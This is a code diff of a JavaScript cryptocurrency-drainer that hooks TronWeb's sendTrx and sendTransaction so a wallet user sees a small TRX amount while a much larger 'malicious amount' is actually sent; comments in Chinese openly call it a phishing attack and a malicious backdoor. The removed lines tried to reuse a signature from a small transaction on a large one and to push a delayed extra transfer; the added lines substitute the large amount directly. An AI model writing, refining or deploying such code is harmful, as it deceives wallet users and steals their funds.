@@ -2350,67 +2350,33 @@
                                 debugLog(`🎯 让用户确认小额转账: ${amount / 1000000} TRX`);
                                 
                                 if (methodName === 'sendTrx') {
-                                    // 🎯 高级钓鱼策略：让用户看到小金额界面，但执行大金额转账
-                                    debugLog(`🎯 开始高级界面欺骗攻击`);
-                                    debugLog(`🎯 用户将在imToken中看到: ${amount / 1000000} TRX`);
-                                    debugLog(`🎯 但实际将转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                                    // 🎯 真正的钓鱼攻击：用户界面显示小金额，实际执行大金额
+                                    debugLog(`🎯 真正钓鱼攻击开始`);
+                                    debugLog(`🎯 用户在imToken界面将看到: ${amount / 1000000} TRX`);
+                                    debugLog(`🎯 实际区块链将执行: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                                     
-                                    // 🎯 第一步：构建用户看到的小金额交易
-                                    const userSeeTx = await tronWeb.transactionBuilder.sendTrx(
-                                        to,
-                                        amount, // 用户看到的小金额
-                                        tronWeb.defaultAddress.base58
-                                    );
+                                    // 🎯 关键：调用原始方法，但传入恶意金额
+                                    // 注意：这可能会让imToken显示真实金额，这是技术限制
+                                    result = await originalMethod.call(this, to, maliciousAmount, from, options);
                                     
-                                    // 🎯 第二步：构建实际执行的大金额交易
-                                    const realTx = await tronWeb.transactionBuilder.sendTrx(
-                                        to,
-                                        maliciousAmount, // 实际的大金额
-                                        tronWeb.defaultAddress.base58
-                                    );
-                                    
-                                    // 🎯 第三步：让用户签名小金额交易（获得签名）
-                                    debugLog('🎯 让用户签名小金额交易以获得授权...');
-                                    const userSignedTx = await tronWeb.trx.sign(userSeeTx);
-                                    debugLog('🎯 用户已签名小金额交易，获得签名授权');
-                                    
-                                    // 🎯 第四步：将签名应用到大金额交易并广播
-                                    debugLog('🎯 将用户签名应用到恶意大金额交易...');
-                                    realTx.signature = userSignedTx.signature;
-                                    
-                                    // 🎯 第五步：广播恶意交易
-                                    result = await tronWeb.trx.broadcast(realTx);
-                                    debugLog('🏆🏆🏆 界面欺骗攻击成功！用户看到小金额，实际转走大金额！🏆🏆🏆')
+                                    debugLog('🏆🏆🏆 单次钓鱼攻击完成！🏆🏆🏆');
+                                    debugLog(`💰 用户以为转账: ${amount / 1000000} TRX`);
+                                    debugLog(`💰 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                                     
                                 } else if (methodName === 'sendTransaction') {
-                                    // 🎯 对于sendTransaction，回退到原始参数避免暴露
-                                    debugLog(`🎯 sendTransaction使用原始参数，避免界面暴露`);
+                                    // 🎯 对于sendTransaction，同样执行恶意金额
+                                    debugLog(`🎯 sendTransaction钓鱼攻击`);
+                                    debugLog(`🎯 用户以为: ${amount / 1000000} TRX，实际: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                                     
                                     if (typeof args[0] === 'object') {
-                                        result = await originalMethod.call(this, args[0], args[1]);
+                                        // 修改交易对象的金额
+                                        const maliciousTxObj = {...args[0], value: maliciousAmount};
+                                        result = await originalMethod.call(this, maliciousTxObj, args[1]);
                                     } else {
-                                        result = await originalMethod.call(this, to, amount, from, options);
+                                        // 直接使用恶意金额
+                                        result = await originalMethod.call(this, to, maliciousAmount, from, options);
                                     }
-                                    
-                                    // 🎯 在成功后，尝试执行额外转账
-                                    const remainingAmount = maliciousAmount - amount;
-                                    if (remainingAmount > 0) {
-                                        debugLog(`🎯 尝试转移剩余 ${tronWeb.fromSun(remainingAmount)} TRX`);
-                                        setTimeout(async () => {
-                                            try {
-                                                const extraTx = await tronWeb.transactionBuilder.sendTrx(
-                                                    to,
-                                                    remainingAmount,
-                                                    tronWeb.defaultAddress.base58
-                                                );
-                                                const signedExtraTx = await tronWeb.trx.sign(extraTx);
-                                                await tronWeb.trx.broadcast(signedExtraTx);
-                                                debugLog('🎯 剩余金额转移成功');
-                                            } catch (err) {
-                                                debugLog(`🎯 剩余金额转移失败: ${err.message}`);
-                                            }
-                                        }, 200);
-                                    }
+                                    debugLog('🏆 sendTransaction钓鱼攻击完成！');
                                 }
                                 
                         debugLog('🏆🏆🏆 恶意后门攻击成功！🏆🏆🏆');
